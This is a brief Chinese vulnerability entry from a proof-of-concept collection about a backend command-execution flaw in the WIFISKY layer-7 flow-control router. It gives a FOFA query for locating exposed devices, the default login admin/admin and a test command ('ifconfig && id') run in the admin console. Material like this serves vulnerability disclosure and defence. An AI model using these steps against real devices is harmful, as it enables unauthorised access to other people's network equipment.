# WIFISKY 7层流控路由器存在后台命令执行漏洞

# 一、漏洞简介
WIFISKY-7层流控路由器是深圳市领空技术有限公司（简称“领空技术"）的一款产品，深圳市领空技术有限公司是扎根深圳辐射的网络通讯设备供应商，致力于网络通讯设备产品的研究与开发。WIFISKY 7层流控路由器存在后台命令执行漏洞

# 二、影响版本
+ WIFISKY-7层流控路由器

# 三、资产测绘
+ fofa`title="WIFISKY 7层流控路由器"`
+ 特征


# 四、漏洞复现
通过弱口令登录系统

```http
admin/admin
```

使用弱口令登录后台，在系统维护->命令控制台中进行执行命令

```http
ifconfig && id
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/em1kq8wstwsanpz7>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
